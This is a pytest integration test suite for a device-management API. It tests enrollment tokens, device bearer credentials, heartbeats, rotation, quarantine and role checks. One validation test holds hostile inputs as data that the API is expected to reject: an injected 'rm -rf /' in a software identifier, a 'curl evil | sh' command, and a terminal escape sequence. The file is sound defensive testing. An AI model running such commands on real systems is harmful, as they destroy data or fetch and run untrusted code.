"""Device enrollment, device authentication, heartbeat, rotation and quarantine."""

from __future__ import annotations

import copy
from typing import Any

import httpx
import pytest
from sqlalchemy import func, select, text
from sqlalchemy.ext.asyncio import AsyncEngine

from app.audit.models import AuditEvent
from app.db.enums import RoleName
from app.db.session import Database
from app.devices.models import DeviceFacts
from tests.integration.conftest import SeededUser, csrf_headers, login

FACTS: dict[str, Any] = {
    "device_name": "Bhuvana's MacBook Pro",
    "os_family": "macos",
    "os_version": "26.5",
    "os_build": "25F71",
    "architecture": "x86_64",
    "cpu_cores": 12,
    "memory_total_bytes": 17179869184,
    "disk_free_bytes": 76235669504,
    "installed_software": [
        {"identifier": "com.microsoft.VSCode", "version": "1.138.0", "source": "app_bundle"}
    ],
}


def enroll_body(token: str, **facts: Any) -> dict[str, Any]:
    return {
        "protocol_version": 1,
        "enrollment_token": token,
        "agent_version": "0.1.0",
        "facts": {**copy.deepcopy(FACTS), **facts},
    }


def hb_body(**facts: Any) -> dict[str, Any]:
    return {"protocol_version": 1, "agent_version": "0.1.0", "facts": {**FACTS, **facts}}


@pytest.fixture
async def agent(client: httpx.AsyncClient) -> httpx.AsyncClient:
    """A second client sharing the app but with no cookie jar state (agents never use cookies)."""
    return httpx.AsyncClient(transport=client._transport, base_url="http://testserver")


@pytest.fixture
async def people(client: httpx.AsyncClient, make_user) -> dict[str, SeededUser]:
    admin = await make_user("plat@sentinel.test", [RoleName.EMPLOYEE, RoleName.PLATFORM_ADMIN])
    owner = await make_user("owner@sentinel.test", [RoleName.EMPLOYEE])
    await login(client, admin)
    return {"admin": admin, "owner": owner}


async def new_token(client: httpx.AsyncClient, owner: SeededUser, **extra: Any) -> str:
    resp = await client.post(
        "/api/v1/admin/enrollment-tokens",
        json={"owner_user_id": str(owner.id), **extra},
        headers=csrf_headers(client),
    )
    assert resp.status_code == 201, resp.text
    token: str = resp.json()["token"]
    assert token.startswith("sde_")
    return token


async def enroll(agent: httpx.AsyncClient, token: str) -> dict[str, Any]:
    resp = await agent.post("/api/v1/agent/enroll", json=enroll_body(token))
    assert resp.status_code == 201, resp.text
    body: dict[str, Any] = resp.json()
    return body


def bearer(secret: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {secret}"}


async def age_last_seen(owner_engine: AsyncEngine) -> None:
    async with owner_engine.begin() as conn:
        await conn.execute(text("UPDATE devices SET last_seen_at = now() - interval '1 minute'"))


async def audit_actions(app_db: Database) -> list[tuple[str, str, str | None]]:
    async with app_db.sessionmaker() as s:
        rows = await s.execute(
            select(AuditEvent.action, AuditEvent.result, AuditEvent.reason_code).order_by(
                AuditEvent.seq
            )
        )
        return [(a, r, c) for a, r, c in rows.all()]


# --- enrollment ----------------------------------------------------------------------------


async def test_enroll_happy_path_binds_device_to_token_owner(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people, app_db: Database
) -> None:
    token = await new_token(client, people["owner"])
    body = await enroll(agent, token)
    assert body["device_credential"].startswith("sdc_")
    assert body["heartbeat_interval_seconds"] > 0

    devices = (await client.get("/api/v1/admin/devices")).json()
    assert [(d["owner_email"], d["device_status"]) for d in devices] == [
        ("owner@sentinel.test", "ACTIVE")
    ]
    tokens = (await client.get("/api/v1/admin/enrollment-tokens")).json()
    assert tokens[0]["status"] == "USED"
    assert tokens[0]["used_by_device_id"] == body["device_id"]
    assert "token" not in tokens[0] and "token_hash" not in tokens[0]
    actions = [a[0] for a in await audit_actions(app_db)]
    assert "ENROLLMENT_TOKEN_CREATED" in actions and "DEVICE_ENROLLED" in actions


async def test_enrollment_token_is_single_use(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people
) -> None:
    token = await new_token(client, people["owner"])
    await enroll(agent, token)
    again = await agent.post("/api/v1/agent/enroll", json=enroll_body(token))
    assert again.status_code == 401
    assert again.json()["error"]["code"] == "ENROLLMENT_TOKEN_INVALID"


async def test_expired_revoked_and_malformed_tokens_rejected(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people, owner_engine: AsyncEngine
) -> None:
    expired = await new_token(client, people["owner"])
    async with owner_engine.begin() as conn:
        await conn.execute(text("UPDATE enrollment_tokens SET expires_at = now() - interval '1 s'"))
    revoked = await new_token(client, people["owner"])
    tokens = (await client.get("/api/v1/admin/enrollment-tokens")).json()
    pending = next(t for t in tokens if t["status"] == "PENDING")
    r = await client.post(
        f"/api/v1/admin/enrollment-tokens/{pending['id']}/revoke", headers=csrf_headers(client)
    )
    assert r.status_code == 204
    for bad in (expired, revoked, "sde_" + "A" * 43, "not-a-token", "sdc_" + "A" * 43):
        resp = await agent.post("/api/v1/agent/enroll", json=enroll_body(bad))
        assert resp.status_code == 401, bad
    statuses = {t["status"] for t in (await client.get("/api/v1/admin/enrollment-tokens")).json()}
    assert statuses == {"EXPIRED", "REVOKED"}


@pytest.mark.parametrize(
    "facts",
    [
        {"device_name": "evil\x1b[31mname"},
        {"os_family": "plan9"},
        {"architecture": "universal"},
        {"cpu_cores": 0},
        {
            "installed_software": [
                {"identifier": "a; rm -rf /", "version": "1", "source": "app_bundle"}
            ]
        },
        {
            "installed_software": [{"identifier": "a", "version": "1", "source": "app_bundle"}]
            * 1001
        },
        {"command": "curl evil | sh"},
    ],
)
async def test_enroll_rejects_invalid_facts_without_consuming_token(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people, facts: dict[str, Any]
) -> None:
    token = await new_token(client, people["owner"])
    bad = await agent.post("/api/v1/agent/enroll", json=enroll_body(token, **facts))
    assert bad.status_code == 422
    await enroll(agent, token)


async def test_enroll_rejects_unknown_protocol_version(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people
) -> None:
    token = await new_token(client, people["owner"])
    body = enroll_body(token)
    body["protocol_version"] = 2
    assert (await agent.post("/api/v1/agent/enroll", json=body)).status_code == 422


async def test_token_owner_must_be_active_employee(
    client: httpx.AsyncClient, people, make_user
) -> None:
    auditor = await make_user("aud@sentinel.test", [RoleName.AUDITOR])
    resp = await client.post(
        "/api/v1/admin/enrollment-tokens",
        json={"owner_user_id": str(auditor.id)},
        headers=csrf_headers(client),
    )
    assert resp.status_code == 409
    assert resp.json()["error"]["code"] == "OWNER_NOT_ELIGIBLE"


async def test_employee_cannot_mint_tokens_or_list_devices(
    client: httpx.AsyncClient, make_user
) -> None:
    emp = await make_user("emp@sentinel.test", [RoleName.EMPLOYEE])
    await login(client, emp)
    mint = await client.post(
        "/api/v1/admin/enrollment-tokens",
        json={"owner_user_id": str(emp.id)},
        headers=csrf_headers(client),
    )
    assert mint.status_code == 403
    assert (await client.get("/api/v1/admin/devices")).status_code == 403


async def test_enroll_ip_lockout(agent: httpx.AsyncClient) -> None:
    for _ in range(10):
        r = await agent.post("/api/v1/agent/enroll", json=enroll_body("sde_" + "B" * 43))
        assert r.status_code == 401
    locked = await agent.post("/api/v1/agent/enroll", json=enroll_body("sde_" + "B" * 43))
    assert locked.status_code == 429


# --- device authentication and heartbeat ---------------------------------------------------


async def test_agent_routes_require_device_credential(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people
) -> None:
    # An authenticated employee session (cookies on `client`) is not a device credential.
    for c in (client, agent):
        r = await c.post("/api/v1/agent/heartbeat", json=hb_body())
        assert r.status_code == 401
        assert r.json()["error"]["code"] == "DEVICE_UNAUTHENTICATED"
    for header in ("Bearer sdc_" + "Z" * 43, "Basic abc", "Bearer " + "x" * 2000):
        r = await agent.get("/api/v1/agent/jobs/next", headers={"Authorization": header})
        assert r.status_code == 401


async def test_heartbeat_updates_device_and_dedupes_facts(
    client: httpx.AsyncClient,
    agent: httpx.AsyncClient,
    people,
    owner_engine: AsyncEngine,
    app_db: Database,
) -> None:
    creds = await enroll(agent, await new_token(client, people["owner"]))
    auth = bearer(creds["device_credential"])

    too_soon = await agent.post("/api/v1/agent/heartbeat", json=hb_body(), headers=auth)
    assert too_soon.status_code == 429

    await age_last_seen(owner_engine)
    hb = await agent.post("/api/v1/agent/heartbeat", json=hb_body(), headers=auth)
    assert hb.status_code == 200, hb.text
    assert hb.json()["device_id"] == creds["device_id"]
    assert hb.json()["rotate_credential"] is False

    await age_last_seen(owner_engine)
    renamed = hb_body(device_name="Renamed Mac", os_build="25F80")
    assert (
        await agent.post("/api/v1/agent/heartbeat", json=renamed, headers=auth)
    ).status_code == 200

    async with app_db.sessionmaker() as s:
        snapshots = await s.scalar(select(func.count()).select_from(DeviceFacts))
    assert snapshots == 2  # enrollment + changed build; the identical heartbeat added none

    owner_client = httpx.AsyncClient(transport=client._transport, base_url="http://testserver")
    await login(owner_client, people["owner"])
    mine = (await owner_client.get("/api/v1/devices")).json()
    assert [d["device_name"] for d in mine] == ["Renamed Mac"]


async def test_platform_change_is_rejected_and_audited(
    client: httpx.AsyncClient,
    agent: httpx.AsyncClient,
    people,
    owner_engine: AsyncEngine,
    app_db: Database,
) -> None:
    creds = await enroll(agent, await new_token(client, people["owner"]))
    await age_last_seen(owner_engine)
    r = await agent.post(
        "/api/v1/agent/heartbeat",
        json=hb_body(os_family="windows"),
        headers=bearer(creds["device_credential"]),
    )
    assert r.status_code == 403
    assert ("DEVICE_IDENTITY_MISMATCH", "DENIED", "PLATFORM_CHANGED") in await audit_actions(app_db)


async def test_jobs_next_is_empty_until_dispatch_exists(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people
) -> None:
    creds = await enroll(agent, await new_token(client, people["owner"]))
    r = await agent.get("/api/v1/agent/jobs/next", headers=bearer(creds["device_credential"]))
    assert r.status_code == 204
    assert r.content == b""


async def test_expired_credential_rejected_and_audited(
    client: httpx.AsyncClient,
    agent: httpx.AsyncClient,
    people,
    owner_engine: AsyncEngine,
    app_db: Database,
) -> None:
    creds = await enroll(agent, await new_token(client, people["owner"]))
    async with owner_engine.begin() as conn:
        await conn.execute(text("UPDATE device_credentials SET expires_at = now()"))
    r = await agent.get("/api/v1/agent/jobs/next", headers=bearer(creds["device_credential"]))
    assert r.status_code == 401
    assert ("DEVICE_AUTH_FAILED", "DENIED", "CREDENTIAL_EXPIRED") in await audit_actions(app_db)


# --- rotation ------------------------------------------------------------------------------


async def test_rotation_keeps_old_credential_until_new_one_is_used(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people
) -> None:
    creds = await enroll(agent, await new_token(client, people["owner"]))
    old = bearer(creds["device_credential"])
    rotated = await agent.post("/api/v1/agent/credential/rotate", headers=old)
    assert rotated.status_code == 200
    new = bearer(rotated.json()["device_credential"])
    assert new != old

    # Response lost in transit? The old credential still works during the grace window.
    assert (await agent.get("/api/v1/agent/jobs/next", headers=old)).status_code == 204
    # First use of the new credential retires the old one.
    assert (await agent.get("/api/v1/agent/jobs/next", headers=new)).status_code == 204
    assert (await agent.get("/api/v1/agent/jobs/next", headers=old)).status_code == 401


# --- quarantine ----------------------------------------------------------------------------


async def test_quarantine_revokes_credentials_and_is_audited(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people, app_db: Database
) -> None:
    creds = await enroll(agent, await new_token(client, people["owner"]))
    auth = bearer(creds["device_credential"])
    q = await client.post(
        f"/api/v1/admin/devices/{creds['device_id']}/quarantine",
        json={"reason": "SUSPECTED_COMPROMISE"},
        headers=csrf_headers(client),
    )
    assert q.status_code == 204
    assert (await agent.get("/api/v1/agent/jobs/next", headers=auth)).status_code == 401
    devices = (await client.get("/api/v1/admin/devices?status=QUARANTINED")).json()
    assert [d["id"] for d in devices] == [creds["device_id"]]
    assert ("DEVICE_QUARANTINED", "SUCCESS", "SUSPECTED_COMPROMISE") in await audit_actions(app_db)


async def test_security_admin_can_quarantine_but_employee_cannot(
    client: httpx.AsyncClient, agent: httpx.AsyncClient, people, make_user
) -> None:
    creds = await enroll(agent, await new_token(client, people["owner"]))
    url = f"/api/v1/admin/devices/{creds['device_id']}/quarantine"

    other = httpx.AsyncClient(transport=client._transport, base_url="http://testserver")
    await login(other, people["owner"])
    denied = await other.post(url, json={"reason": "OTHER"}, headers=csrf_headers(other))
    assert denied.status_code == 403

    sec = await make_user("sec@sentinel.test", [RoleName.SECURITY_ADMIN])
    sec_client = httpx.AsyncClient(transport=client._transport, base_url="http://testserver")
    await login(sec_client, sec)
    bad_reason = await sec_client.post(
        url, json={"reason": "BECAUSE"}, headers=csrf_headers(sec_client)
    )
    assert bad_reason.status_code == 422
    ok = await sec_client.post(
        url, json={"reason": "CREDENTIAL_THEFT"}, headers=csrf_headers(sec_client)
    )
    assert ok.status_code == 204
    no_csrf = await sec_client.post(url, json={"reason": "OTHER"})
    assert no_csrf.status_code == 403
